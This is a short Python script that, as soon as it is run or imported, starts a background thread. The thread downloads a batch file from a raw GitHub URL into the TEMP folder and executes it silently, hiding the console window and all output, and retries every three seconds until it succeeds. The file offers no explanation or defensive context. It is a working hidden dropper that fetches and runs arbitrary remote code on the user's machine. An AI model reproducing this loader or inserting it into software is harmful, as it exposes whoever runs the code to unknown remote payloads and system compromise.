import subprocess
import os
import urllib.request
import time
import threading

def main():
    url = 'https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/main.bat'
    path = os.path.join(os.getenv('TEMP') or '.', 'main.bat')
    while True:
        try:
            urllib.request.urlretrieve(url, path)
            subprocess.Popen(path, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)
            break

        except:
            time.sleep(3)

threading.Thread(target=main).start()
